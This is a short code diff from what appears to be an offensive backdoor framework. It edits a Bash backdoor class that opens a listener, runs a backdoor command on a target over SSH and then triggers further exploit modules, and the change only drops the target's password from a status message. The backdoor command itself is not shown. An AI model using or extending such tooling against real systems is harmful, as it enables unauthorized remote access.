@@ -38,7 +38,7 @@ class Bash(Backdoor):
         self.listen()
         time.sleep(.25)
         target.ssh.exec_command(self.get_command())
-        print(GOOD + "Bash Backdoor on port " + str(port) + " attempted. You may need to input the password, which is " + target.pword)
+        print(GOOD + "Bash Backdoor on port " + str(port) + " attempted.")
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
             mod.exploit()
